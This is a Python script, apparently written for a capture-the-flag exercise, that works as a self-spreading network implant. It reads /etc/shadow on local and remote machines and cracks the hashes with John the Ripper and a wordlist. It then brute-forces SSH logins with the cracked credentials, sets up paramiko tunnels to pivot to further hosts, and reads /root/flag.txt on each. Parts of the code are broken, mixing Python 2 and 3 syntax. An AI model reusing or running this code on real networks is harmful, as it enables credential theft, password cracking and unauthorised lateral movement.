import threading
import os
from os.path import expanduser
import subprocess
import sys

#list with machine IPs and ports
machine_list = []

#tunnel list
tunnel_list = []

#define creds
user_list = []
pass_list = []

# populate initial dictionaries from local files
with open(os.path.join(sys.path[0], 'servers.txt'), "r") as f:
    for x in f.readlines():
        ip, port = x.split(':')
        machine_list.append((ip, port))
    print("machine list populated from local file")

def get_creds(local):
    print('searching for local passwords...')
    if local == True:
        stdout1 = subprocess.check_output(["cat", "/etc/shadow"])
        shadow_text1 = stdout1
    else:
        stdin, stdout1, stderr = client.exec_command('cat /etc/shadow')
        shadow_text1 = stdout1.read()
    print(shadow_text1)
    if os.path.exists('shadow_text.txt'):
        os.remove('shadow_text.txt')
    print('old local shadow file successfully removed')
    shadow_file1 = open('shadow_text.txt', 'w')
    shadow_file1.write(shadow_text1)
    shadow_file1.close()
    print('new local shadow file written')
    #--pot=john.pot
    subprocess.check_output(['rm', '-rf', 'john.pot'])
    os.system('john shadow_text.txt --wordlist=rockyou.txt --pot=john.pot')
    stdout2 = subprocess.check_output('john shadow_text.txt --show --pot=john.pot', shell=True)
    print(stdout2)
    with open('shadow_cracked.txt', 'r+') as q:
        q.write(stdout2)
    with open('shadow_cracked.txt', 'r') as z:
        for line in z.readlines():
            if ':' in line:
                user = line.split(':')[0]
                password = line.split(':')[1]
                user_list.append(user)
                pass_list.append(password)

get_creds(True)

print(user_list)
print(pass_list)
# PARAMIKO CODE
# -----------------------------------------------------------------
"""
Sample script showing how to do local port forwarding over paramiko.
This script connects to the requested SSH server and sets up local port
forwarding (the openssh -L option) from a local port through a tunneled
connection to a destination reachable from the SSH server machine.
"""
import getpass
import socket
import select

try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer

import sys
from optparse import OptionParser
import paramiko
g_verbose = True

class ForwardServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True

class Handler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            verbose(
                "Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return
        if chan is None:
            verbose(
                "Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return

        verbose(
            "Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose("Tunnel closed from %r" % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    ForwardServer(("", local_port), SubHander).serve_forever()


def verbose(s):
    if g_verbose:
        print(s)

HELP = """\
Set up a forward tunnel across an SSH server, using paramiko. A local port
(given with -p) is forwarded across an SSH session to an address:port from
the SSH server. This is similar to the openssh -L option.
"""


def get_host_port(spec, default_port):
    "parse 'hostname:22' into a host and port, with the port optional"
    args = (spec.split(":", 1) + [default_port])[:2]
    args[1] = int(args[1])
    return args[0], args[1]


# END PARAMIKO CODE
# -----------------------------------------------------------------

def find_servers():
    print '[*] searching for servers...'
    try:
        stdin, stdout, stderr = client.exec_command('cat servers.txt')
       # array = stdout.readlines()
        for line in stdout.readlines():
            ip, port = line.split(':')
        #print 'ip: ', ip
        #print 'port: ', port
   # TUNNEL TO ALL SERVERS, dict for ip: my port in which tunnel
            print '[*] initializing tunnel to', ip
            th = threading.Thread(target=forward_tunnel, args=(local_port, ip, int(port), client.get_transport()))
            th.start()
  # thread TUNNEL FOR EACH remote IP, local tunnel
         #   tunnel_list.append((ip, port))
            machine_list.append(('127.0.0.1', local_port))
            print '[*] added ', ip, ':', port, ' to machine list!'
        print '[*] updated machine list: ', machine_list
    except Exception as e:
        print '[*] exception: ', e
    #print(machine_list)

def find_flag():
    print('[*] searching for flag...')
    try:
        stdin, stdout, stderr = client.exec_command('cat /root/flag.txt')
        #if 'No such file ' in stdout.read():
         #   print('Flag NOTTTT found!')
        #print('[*] Flag... found? contents: ')
        print 'contents: '
        print(stdout.read())
    except Exception as e:
        print('Exception occurred when searching for flag...')
        print(e)

# start crawling through network
local_port = 5000
login = False
#for ip, port in machine_dict.items():
while len(machine_list) > 0:
    login = False
    ip, port = machine_list[0]
    machine = machine_list[0]
    print '[*] target: ', ip, port
    print 'remaining machines: ', machine_list
    for user in user_list:
        if login == True:
            break
        for password in pass_list:
            if login == True:
                break
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
                print '[*] trying to connect to ', ip, 'with ', user, '/',password
                client.connect(ip, port=int(port), username = user, password = password, timeout=3)
                print '[*] LOGGED into ', ip, 'with username ', user, 'and password ', password
           # ONCE I LOGIN, REMOVE MACHINE AND GET OUT OF USER AND PASSWORD LOOP
      #FOUND CONDITION, CHECK EVERY TIME AND SET TO TRUE IF LOGIN... IF FOUND BREAK LOOP
                machine_list.remove(machine)
                get_creds(False)
                find_servers()
                find_flag()
                local_port += 1
                login = True
            except Exception as e:
                print('[*] exception occurred, login failed, trying next set of creds...')
                print(e)
                pass
            if login == True:
                break
    if login == False:
        machine_list.remove(machine)
        machine_list.append(machine)

print '[*] no machines left to scan, implant complete. closing threads...'
